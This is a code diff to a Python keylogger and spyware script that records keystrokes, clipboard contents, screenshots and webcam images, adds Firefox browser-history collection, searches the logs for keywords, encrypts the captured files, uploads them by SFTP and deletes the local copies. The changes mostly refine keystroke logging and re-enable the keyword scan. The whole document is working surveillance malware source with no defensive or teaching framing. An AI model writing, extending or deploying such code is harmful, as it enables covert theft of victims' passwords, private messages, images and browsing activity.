@@ -8,6 +8,9 @@ import win32clipboard
 from PIL import ImageGrab
 from cryptography.fernet import Fernet
 from pynput.keyboard import Key, Listener
+from browser_history import get_history
+from browser_history.browsers import Firefox
+
 
 keys_information = "key_log.txt"
 clipboard_information = "Clipboard.txt"
@@ -39,7 +42,7 @@ file_path = path + extend
 
 # only string will be recorded
 def copy_clipboard():
-    with open(file_path + extend + clipboard_information, "a") as f:
+    with open(file_path + clipboard_information, "a") as f:
         try:
             win32clipboard.OpenClipboard()
             pasted_data = win32clipboard.GetClipboardData()
@@ -52,7 +55,7 @@ def copy_clipboard():
 
 # Captures Webcam using cv2 module
 def capture_webcam():
-    camera = cv2.VideoCapture(0)
+    camera = cv2.VideoCapture(0, cv2.CAP_MSMF)
     time_str = time.strftime("IMG_%Y%m%d_%H%M%S")  # To save each image with the time stamp
     check, frame = camera.read()
     cv2.waitKey(0)  # waits 0 milliseconds after each keypress
@@ -120,11 +123,15 @@ def read_file():
         if any(word in line for word in string1):
             print(line)
             print("the word was found")
+
         else:
             print("the word is not found")
 
     # closing text file
     file1.close()
+
+
+
 
 
 number_of_iterations = 0
@@ -163,12 +170,18 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
                     # size = f.tell()
                     # f.truncate(size -1)
                     # f.close()
-                    f.write('_BS_')
+                    f.write('(BS)')
                 elif k.find("enter") > 0:  # changes any enter key found to '\n' (new line) to make it readable
                     f.write('\n')
                     f.close()
                 elif k.find("delete") > 0:
-                    f.write(".DEL.")
+                    f.write("(DEL)")
+                    f.close()
+                elif k.find('up') > 0:
+                    f.write("")
+                    f.close()
+                elif k.find('down') > 0:
+                    f.write("")
                     f.close()
                 elif k.find('left') > 0:
                     f.write("")
@@ -177,6 +190,12 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
                     f.write("")
                     f.close()
                 elif k.find('shift') > 0:
+                    f.write("")
+                    f.close()
+                elif k.find('ctrl') > 0:
+                    f.write("")
+                    f.close()
+                elif k.find('alt') > 0:
                     f.write("")
                     f.close()
                 elif k.find("Keys") == -1:
@@ -199,8 +218,7 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
         screenshots()
         copy_clipboard()
         capture_webcam()
-        time.sleep(10)
-        # read_file()
+        read_file()
         encrypt_files()
         sftp_files()
         delete_files()
@@ -211,5 +229,3 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
         stopTime = time.time() + time_iterations
 
 cv2.destroyAllWindows()
-
-
